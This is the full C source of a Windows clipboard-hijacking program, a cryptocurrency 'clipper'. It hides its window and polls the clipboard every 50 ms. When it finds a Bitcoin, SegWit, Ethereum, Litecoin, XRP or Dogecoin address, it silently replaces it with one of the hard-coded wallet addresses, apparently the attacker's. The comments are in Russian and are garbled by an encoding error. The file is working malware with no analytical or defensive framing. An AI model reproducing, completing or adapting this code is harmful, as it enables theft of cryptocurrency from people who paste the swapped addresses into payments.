#include "re.h"
#include <windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

typedef struct crypto {
	char* ptn;
	char* address;
};

char* getclipboard()
{
	static HANDLE clip;
	if (OpenClipboard(NULL))
	{
		clip = GetClipboardData(CF_TEXT);
		CloseClipboard();
	}
	return (char*)clip;
}

void setclipboard(char* text)
{
	HGLOBAL global = GlobalAlloc(GMEM_FIXED, strlen(text) + 1);
	memcpy(global, text, strlen(text));
	if (OpenClipboard(NULL))
	{
		EmptyClipboard();
		SetClipboardData(CF_TEXT, global);
		CloseClipboard();
	}
}

int main() {
	// ���� ��������� ���� ������
	const char* btcadr = "1JhTCjmLd6NGzRGEm4iysk72SbyFAQhgUE";
	const char* segwitadr = "bc1qmq5eh2stp4nkxetgd87cw5c85k3n70070t53av";
	const char* ethadr = "0x40f4DF3439C03A39B450E758a95680bac21F7452";
	const char* ltcadr = "MQd1fJwqBJvwLuyhr17PhEFx1swiqDbPQS";
	const char* xrpadr = "r3A5A3AjqHL1XdjTjpDUwm9ugWt4gvVNT";
	const char* dogeadr = "DHdy14RERz94jo3oaBMt3aTCGgrerZQSDz";

	struct crypto btc = { .ptn = "^[13][a-km-zA-HJ-NP-Z1-9]*$",				.address = btcadr }; // ������������� ����� �� �������������� � tiny regex
	struct crypto segwit = { .ptn = "^bc1q[a-zA-HJ-NP-Z0-9]*$",				.address = segwitadr }; // �� p2pkh � p2wpkh ������ ���������, ��� ��� ��������� ������ ������ �� ������ (bc1q) ����� �������
	struct crypto eth = { .ptn = "^0x[a-fA-F0-9]*$",						.address = ethadr };
	struct crypto ltc = { .ptn = "^[LM3][a-km-zA-HJ-NP-Z1-9]*$",			.address = ltcadr };
	struct crypto xrp = { .ptn = "^r[0-9a-zA-Z]*$",							.address = xrpadr };
	struct crypto doge = { .ptn = "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]*$",	.address = dogeadr };


	struct crypto all[6] = { btc, segwit, eth, ltc, xrp, doge }; // ��� 6 - ���������� ��������
	
	while (1) {
		char* clipdata = getclipboard(); // ��������� ������ ������
		if (clipdata != NULL) { // ���� � ������ ���-�� ����
			for (int i = 0; i < 6; i++) { // ���� �� ���� ����� ���������, ��� 6 - ���������� ��������
				int matchlen;
				int match = re_match(all[i].ptn, clipdata, &matchlen); // ��������, �������� �� ����� � ������ ��������������� �������
				if (match != -1) { // ���� ��������, ������� ������ ������ �� �������� � ���� �����
					setclipboard(all[i].address);
				}
			}
		}
		Sleep(50); // ����� �� ������� ����, ����� ������ �������� ��� �� 0.05 ���
	}
}